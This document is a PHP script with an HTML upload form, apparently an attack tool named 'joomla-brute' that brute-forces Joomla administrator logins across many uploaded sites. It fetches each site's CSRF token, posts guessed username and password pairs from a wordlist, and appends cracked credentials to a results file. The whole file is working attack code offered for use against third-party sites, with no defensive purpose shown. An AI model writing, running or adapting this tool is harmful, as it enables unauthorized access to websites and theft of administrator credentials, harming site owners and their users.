<p># joomla-brute </p>
    <form method="post" action="" enctype="multipart/form-data">
    Admin.....: <input type="text" name="usr" value='admin'> // Ex: admin , administrator ..<br>
    j0s Sites..: <input type="file" name="sites"><br>
    w0rd list..: <input type="file" name="w0rds"><br>
    <input type="submit" name="x" value="start ..!">
    </form>
    <?
    @set_time_limit(0);
    # joomla brute force
    # Coded by MiyaChung & Developed By Lagripe-Dz :P
     
    if($_POST['x']){
     
    echo "<hr>";
     
    $sites = explode("\n",file_get_contents($_FILES["sites"]["tmp_name"])); // Get Sites !
     
    $w0rds = explode("\n",file_get_contents($_FILES["w0rds"]["tmp_name"])); // Get w0rdLiSt !
     
    $Attack = new Joomla_brute_Force(); // Active Class
     
    foreach($w0rds as $pwd){
     
    foreach($sites as $site){
     
    $Attack->check_it(txt_cln($site),$_POST['usr'],txt_cln($pwd)); // Brute :D
    flush();flush();
    }
     
    }
     
    }
     
     
    # Class & Function'z
     
    function txt_cln($value){  return str_replace(array("\n","\r"),"",$value); }
     
    class Joomla_brute_Force{
     
    public function check_it($site,$user,$pass){ // print result
     
    if(eregi('com_config',$this->post($site,$user,$pass))){
     
    echo "<b># Done : $user:$pass -> $site</b><BR>";
    $f = fopen("j0s_result.txt","a+"); fwrite($f , "$user:$pass -> $site\n"); fclose($f);
    flush();
    }else{ echo "# Failed : $user:$pass -> $site<BR>"; flush();}
     
    }
     
    public function post($site,$user,$pass){ // Post -> user & pass
     
    $token = $this->extract_token($site);
     
    $curl=curl_init();
     
    curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($curl,CURLOPT_URL,$site."/administrator/index.php");
    curl_setopt($curl,CURLOPT_COOKIEFILE,'cookie.txt');
    curl_setopt($curl,CURLOPT_COOKIEJAR,'cookie.txt');
    curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.15) Gecko/2008111317  Firefox/3.0.4');
    curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($curl,CURLOPT_POST,1);
    curl_setopt($curl,CURLOPT_POSTFIELDS,'username='.$user.'&passwd='.$pass.'&lang=en-GB&option=com_login&task=login&'.$token.'=1');
    curl_setopt($curl,CURLOPT_TIMEOUT,20);
     
    $exec=curl_exec($curl);
    curl_close($curl);
    return $exec;
     
    }
     
    public function extract_token($site){ // get token from source for -> function post
     
    $source = $this->get_source($site);
     
    preg_match_all("/type=\"hidden\" name=\"([0-9a-f]{32})\" value=\"1\"/si" ,$source,$token);
     
    return $token[1][0];
     
    }
     
    public function get_source($site){ // get source for -> function extract_token
     
    $curl=curl_init();
    curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($curl,CURLOPT_URL,$site."/administrator/index.php");
    curl_setopt($curl,CURLOPT_COOKIEFILE,'cookie.txt');
    curl_setopt($curl,CURLOPT_COOKIEJAR,'cookie.txt');
    curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.15) Gecko/2008111317  Firefox/3.0.4');
    curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($curl,CURLOPT_TIMEOUT,20);
     
    $exec=curl_exec($curl);
    curl_close($curl);
    return $exec;
     
    }
     
    }
     
    ?>